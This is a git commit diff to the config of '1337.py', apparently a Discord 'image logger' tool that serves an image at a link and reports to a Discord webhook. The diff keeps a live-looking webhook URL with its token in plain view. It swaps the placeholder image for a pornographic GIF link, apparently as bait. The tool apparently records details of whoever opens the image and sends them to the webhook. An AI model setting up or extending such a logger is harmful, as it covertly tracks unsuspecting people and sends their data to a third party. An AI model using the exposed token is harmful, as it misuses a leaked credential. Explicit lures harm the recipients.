b98b109ed8d3c47f87adfe54e4d92d3af10442a8
discord-image <gaddarvip@protonmail.com>
2025-02-28 18:28:36 +0300

    Update 1337.py

--- api/1337.py
+++ api/1337.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1345052250195755080/L-kfyycDjOjlmKGBI4TuKJcEDOfTYmh6TZCy3OySegU4JRh464OyYIU-_2G3YOWdBCRV",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://porngif.co/wp-content/uploads/2022/11/92308-porngif-co-update-59534.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
